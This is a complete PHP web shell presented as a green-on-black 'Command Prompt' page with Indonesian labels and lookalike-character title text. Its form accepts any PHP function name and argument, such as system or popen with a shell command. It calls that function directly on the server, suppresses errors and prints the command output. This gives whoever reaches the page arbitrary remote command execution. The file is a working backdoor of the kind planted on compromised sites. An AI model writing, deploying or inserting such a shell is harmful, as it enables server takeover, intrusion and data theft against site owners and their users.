<html>
<body style="background:#111; color:#0f0; font-family:monospace; padding:20px;">
    <h2 style="color:#0f0;">[#] Ćommānd Ṕrőmpt</h2>
    <form method="POST">
        <input type="text" name="x" placeholder="Fungsi (ex: Śystëm)" style="background:#222; color:#0f0; border:1px solid #0f0; padding:5px; width:200px;">
        <input type="text" name="y" placeholder="Perintah (ex: iđ)" style="background:#222; color:#0f0; border:1px solid #0f0; padding:5px; width:300px;">
        <input type="submit" value="Run" style="background:#0f0; color:#000; font-weight:bold; cursor:pointer;">
    </form>
    <hr style="border:1px solid #333;">
    <pre>
    <?php
    if (isset($_POST['x']) && isset($_POST['y'])) {
        $a = $_POST['x'];
        $b = $_POST['y'];

        echo "<b style='color:#fff;'>Executing: $a(\"$b\")</b>\n\n";

        if (is_callable($a)) {
            if ($a === 'popen') {
                $handle = @$a($b . ' 2>&1', 'r');
                if ($handle) {
                    while (!feof($handle)) echo fread($handle, 1024);
                    pclose($handle);
                }
            }
            else {
                echo @$a($b);
            }
        } else {
            echo "<span style='color:red;'>Fungsi '$a' tidak tersedia atau dilarang</span>";
        }
    }
    ?>
    </pre>
</body>
</html>
